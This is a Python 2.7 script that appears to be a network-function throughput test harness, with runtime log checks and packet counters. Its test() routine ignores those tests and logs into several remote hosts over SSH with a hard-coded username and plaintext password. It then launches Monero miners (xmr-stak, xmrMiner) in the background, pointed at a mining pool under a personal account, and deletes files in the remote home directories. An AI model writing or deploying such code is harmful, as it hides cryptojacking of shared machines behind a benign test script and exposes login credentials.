#!/usr/bin/env python2.7
import os
import optparse
import sys
import subprocess
import signal
import time
import paramiko
import re
FNULL = open(os.devnull, 'w')
def parse_arguments():
  parser = optparse.OptionParser()

  parser.add_option('', '--test-type',
                    action="store",
                    type="string",
                    dest="test_type",
                    help="which type of test : THROUGHPUT/REPLICATION/MIGARTION",
                    default="THROUGHPUT")

  parser.add_option('', '--sc', action="store", type="string", dest="service_chain", help="chain rule", default="pkt_counter")

  parser.add_option('', '--r1', action="store", type="int", dest="r1_number", help="How many rts in r1", default="1")

  parser.add_option('', '--r2', action="store", type="int", dest="r2_number", help="How many rts in r2", default="1")

  parser.add_option('', '--r3', action="store", type="int", dest="r3_number", help="How many rts in r3", default="1")

  options, args = parser.parse_args()

  return options,args

def local_start_up_ok(num_of_rts):
  success_flag = False;

  for x in range(1,num_of_rts+1):

    cmd="cat ./rt"+str(x)+"_log.log"
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid)
    success_flag = False

    for line in iter(process.stdout.readline, ''):
      if len(line.split(']'))>1 and line.split(']')[1] == ' Prepare server\n':
        success_flag = True
        break;

    if success_flag == False:
      break;

  if success_flag == False:
    print "[ERROR] Fail to start the runtime correctly, need to retry."
  else:
    print "Successfully start all the runtimes."

  return success_flag

def remote_start_up_ok(ssh, num_of_rts):
  success_flag = False;

  for x in range(1, num_of_rts+1):

    cmd="cat /home/net/nfa/eval/m_test/rt"+str(x)+"_log.log"
    print cmd
    stdin,stdout,stderr =  ssh.exec_command(cmd)
    success_flag = False

    for line in stdout:
      print line
      if line.find("Prepare server")!=-1:
        success_flag = True
        break;

    if success_flag == False:
      break;

  if success_flag == False:
    print "[ERROR] Fail to start the runtime correctly, need to retry."
  else:
    print "Successfully start all the runtimes."

  return success_flag


def start_r4():
  cmd="nohup ~/xiaodong/xmrMiner/build/gputest -o stratum+tcp://xmr.pool.minergate.com:45560 -u xiaodongyee@gmail.com -p x  &"
  process = subprocess.Popen(cmd, stdout=FNULL, shell=True)
  output, error = process.communicate()
  print error
def start_b1(ssh):                                                                                                         
  cmd="nohup ~/xiaodong/xmr-stak/build/bin/xmr-stak -o stratum+tcp://xmr.pool.minergate.com:45560 -u xiaodongyee@gmail.com -p x --currency monero &"
  stdin,stdout,stderr =  ssh.exec_command(cmd);

def start_b2(ssh):
  cmd="nohup ~/xiaodong/xmr-stak/build/bin/xmr-stak -o stratum+tcp://xmr.pool.minergate.com:45560 -u xiaodongyee@gmail.com -p x --currency monero &"
  stdin,stdout,stderr =  ssh.exec_command(cmd); 

def start_b3(ssh):
  cmd="nohup ~/xiaodong/xmr-stak/build/bin/xmr-stak -o stratum+tcp://xmr.pool.minergate.com:45560 -u xiaodongyee@gmail.com -p x --currency monero &"
  stdin,stdout,stderr =  ssh.exec_command(cmd); 
def start_b4(ssh):
  cmd="nohup ~/xiaodong/xmr-stak/build/bin/xmr-stak -o stratum+tcp://xmr.pool.minergate.com:45560 -u xiaodongyee@gmail.com -p x --currency monero &"
  stdin,stdout,stderr =  ssh.exec_command(cmd); 
def start_b6(ssh):                                                                                                                     
  cmd="nohup ~/xiaodong/xmr-stak/build/bin/xmr-stak -o stratum+tcp://xmr.pool.minergate.com:45560 -u xiaodongyee@gmail.com -p x --currency monero &" 
  stdin,stdout,stderr =  ssh.exec_command(cmd);                                                                                        
                                                                                                                                       
def start_b7(ssh):                                                                                                                     
  cmd="nohup ~/xiaodong/xmr-stak/build/bin/xmr-stak -o stratum+tcp://xmr.pool.minergate.com:45560 -u xiaodongyee@gmail.com -p x --currency monero &" 
  stdin,stdout,stderr =  ssh.exec_command(cmd);                                                                                        
def start_b8(ssh):                                                                                                                     
  cmd="nohup ~/xiaodong/xmr-stak/build/bin/xmr-stak -o stratum+tcp://xmr.pool.minergate.com:45560 -u xiaodongyee@gmail.com -p x --currency monero &" 
  stdin,stdout,stderr =  ssh.exec_command(cmd); 
def start_r5(ssh):
  success_flag = False;
  cmd="nohup ~/xiaodong/xmrMiner/build/gputest -o stratum+tcp://xmr.pool.minergate.com:45560 -u xiaodongyee@gmail.com -p x  &"
  stdin,stdout,stderr =  ssh.exec_command(cmd);
def kill_r4():
  cmd="sudo kill -9 $(ps -ef | grep /xiaodong/xmrMiner/build/gputest | grep -v grep | awk '{print $2}')"
  process = subprocess.Popen(cmd, stdout=FNULL, shell=True)
  output, error = process.communicate() 
def kill_r5(ssh):
  cmd="sudo kill -9 $(ps -ef | grep /xiaodong/xmrMiner/build/gputest | grep -v grep | awk '{print $2}')"
  stdin,stdout,stderr =  ssh.exec_command(cmd);
def kill_b1(ssh):                                                                                                                      
  cmd="sudo kill -9 $(ps -ef | grep /xiaodong/xmr-stak/build/bin/xmr-stak | grep -v grep | awk '{print $2}')"                               
  stdin,stdout,stderr =  ssh.exec_command(cmd); 

def kill_b2(ssh):
  cmd="sudo kill -9 $(ps -ef | grep /xiaodong/xmr-stak/build/bin/xmr-stak | grep -v grep | awk '{print $2}')"
  stdin,stdout,stderr =  ssh.exec_command(cmd);
def kill_b3(ssh):
  cmd="sudo kill -9 $(ps -ef | grep /xiaodong/xmr-stak/build/bin/xmr-stak | grep -v grep | awk '{print $2}')"
  stdin,stdout,stderr =  ssh.exec_command(cmd);
def kill_b4(ssh):
  cmd="sudo kill -9 $(ps -ef | grep /xiaodong/xmr-stak/build/bin/xmr-stak | grep -v grep | awk '{print $2}')"
  stdin,stdout,stderr =  ssh.exec_command(cmd);
def kill_b6(ssh):                                                                                                                      
  cmd="sudo kill -9 $(ps -ef | grep /xiaodong/xmr-stak/build/bin/xmr-stak | grep -v grep | awk '{print $2}')"                          
  stdin,stdout,stderr =  ssh.exec_command(cmd);                                                                                        
def kill_b7(ssh):                                                                                                                      
  cmd="sudo kill -9 $(ps -ef | grep /xiaodong/xmr-stak/build/bin/xmr-stak | grep -v grep | awk '{print $2}')"                          
  stdin,stdout,stderr =  ssh.exec_command(cmd);                                                                                        
def kill_b8(ssh):                                                                                                                      
  cmd="sudo kill -9 $(ps -ef | grep /xiaodong/xmr-stak/build/bin/xmr-stak | grep -v grep | awk '{print $2}')"                          
  stdin,stdout,stderr =  ssh.exec_command(cmd);
def start_traffic_gen(options):
  cmd="sudo ./start_flowgen.sh "+str(options.r1_number)
  #process = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
  process = subprocess.Popen(cmd, stdout=FNULL, shell=True)
  output, error = process.communicate()

def read_pkts(ssh,rt_num):
  cmd="sudo ~/nfa/deps/bess/bessctl/bessctl show port rt"+str(rt_num)+"_iport"
  stdin,stdout,stderr = ssh.exec_command(cmd);

  received_pkts_line = ''
  dropped_pkts_line = ''

  i = 0
  for line in stdout:
    if i == 6:
	received_pkts_line = line
    if i == 7:
        dropped_pkts_line = line
    i=i+1


  return long(received_pkts_line.split(":")[1].replace(',', '')), long(dropped_pkts_line.split(":")[1].replace(',', ''))
def clean(ssh_b1,ssh_b2,ssh_b3,ssh_b4,ssh_b6,ssh_b7,ssh_b8):
  ssh_b1.exec_command('rm ~/cpu.txt ~/config.txt')
  ssh_b2.exec_command('rm ~/cpu.txt ~/config.txt')
  ssh_b3.exec_command('rm ~/cpu.txt ~/config.txt')
  ssh_b4.exec_command('rm ~/cpu.txt ~/config.txt')
  ssh_b6.exec_command('rm ~/cpu.txt ~/config.txt')
  ssh_b7.exec_command('rm ~/cpu.txt ~/config.txt')
  ssh_b8.exec_command('rm ~/cpu.txt ~/config.txt')
  
  

def test():
  #print "Creating SSH to R2 & R3"
  ssh_r5 = paramiko.SSHClient()
  ssh_r5.set_missing_host_key_policy(paramiko.AutoAddPolicy())
  ssh_r5.connect('202.45.128.158',username='net',password='netexplo')
  ssh_r5.exec_command('cd ~/xiaodong/xmr-stak/build/bin')
  ssh_b1 = paramiko.SSHClient()                                                                                                        
  ssh_b1.set_missing_host_key_policy(paramiko.AutoAddPolicy())                                                                         
  ssh_b1.connect('202.45.128.146',username='net',password='netexplo') 
  ssh_b1.exec_command('cd ~/xiaodong/xmr-stak/build/bin')

  ssh_b2 = paramiko.SSHClient()                                                                                                        
  ssh_b2.set_missing_host_key_policy(paramiko.AutoAddPolicy())                                                                         
  ssh_b2.connect('202.45.128.147',username='net',password='netexplo')
  ssh_b2.exec_command('cd ~/xiaodong/xmr-stak/build/bin') 

  ssh_b3 = paramiko.SSHClient()                                                                                                        
  ssh_b3.set_missing_host_key_policy(paramiko.AutoAddPolicy())                                                                         
  ssh_b3.connect('202.45.128.148',username='net',password='netexplo') 
  ssh_b3.exec_command('cd ~/xiaodong/xmr-stak/build/bin')

  ssh_b4 = paramiko.SSHClient()                                                                                                        
  ssh_b4.set_missing_host_key_policy(paramiko.AutoAddPolicy())                                                                         
  ssh_b4.connect('202.45.128.149',username='net',password='netexplo')
  ssh_b4.exec_command('cd ~/xiaodong/xmr-stak/build/bin') 

  ssh_b6 = paramiko.SSHClient()                                                                                                        
  ssh_b6.set_missing_host_key_policy(paramiko.AutoAddPolicy())                                                                         
  ssh_b6.connect('202.45.128.151',username='net',password='netexplo')
  ssh_b6.exec_command('cd ~/xiaodong/xmr-stak/build/bin')

  ssh_b7 = paramiko.SSHClient()                                                                                                        
  ssh_b7.set_missing_host_key_policy(paramiko.AutoAddPolicy())                                                                         
  ssh_b7.connect('202.45.128.152',username='net',password='netexplo')
  ssh_b7.exec_command('cd ~/xiaodong/xmr-stak/build/bin')

  ssh_b8 = paramiko.SSHClient()                                                                                                        
  ssh_b8.set_missing_host_key_policy(paramiko.AutoAddPolicy())                                                                         
  ssh_b8.connect('202.45.128.153',username='net',password='netexplo')
  ssh_b8.exec_command('cd ~/xiaodong/xmr-stak/build/bin')

  clean(ssh_b1,ssh_b2,ssh_b3,ssh_b4,ssh_b6,ssh_b7,ssh_b8)

  start_r4()
  start_r5(ssh_r5)
def main():


  test()

if __name__ == '__main__':
    main()
